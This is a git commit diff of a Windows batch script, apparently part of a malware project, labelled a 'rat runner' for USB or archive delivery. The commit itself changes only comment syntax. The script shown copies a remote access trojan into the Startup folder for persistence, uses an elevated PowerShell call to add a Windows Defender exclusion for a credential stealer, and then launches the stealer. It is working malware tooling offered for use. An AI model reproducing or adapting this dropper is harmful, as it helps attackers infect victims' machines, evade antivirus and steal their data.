eb1bb8bc8a74c132bfa741ba11334d8ee4e1f81e
Naratorul <132078235+XYZNaratorul@users.noreply.github.com>
2024-12-10 17:01:08 +0200

    Update Optional_rat_runner_for_USB_or_archive.bat

--- Optional_rat_runner_for_USB_or_archive.bat
+++ Optional_rat_runner_for_USB_or_archive.bat
@@ -1,10 +1,10 @@
-///CREATE AN SHORTCUT OF BOTH THE RAT AND THE STEALER AND MODIFY THE CODE BEFORE RUNNING. MAKE SURE TO ENABLE RUN AS ADMINISTRATOR ON THE SHORTCUT'S OPTIONS.
+:: CREATE AN SHORTCUT OF BOTH THE RAT AND THE STEALER AND MODIFY THE CODE BEFORE RUNNING. MAKE SURE TO ENABLE RUN AS ADMINISTRATOR ON THE SHORTCUT'S OPTIONS.
 
 @echo off
 echo Running shortcuts with administrator privileges...
 set "folderPath=%~dp0lol"
 copy "%folderPath%\*RAT_NAME*" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
-//ORIGINAL STEALER FILE.
+::ORIGINAL STEALER FILE.
 set "PROGRAM_NAME=*STEALER_NAME*"
 powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%PROGRAM_NAME%.exe\"\" -Force' -Verb RunAs"
 start "" "%folderPath%\*STEALER_NAME* - Shortcut"
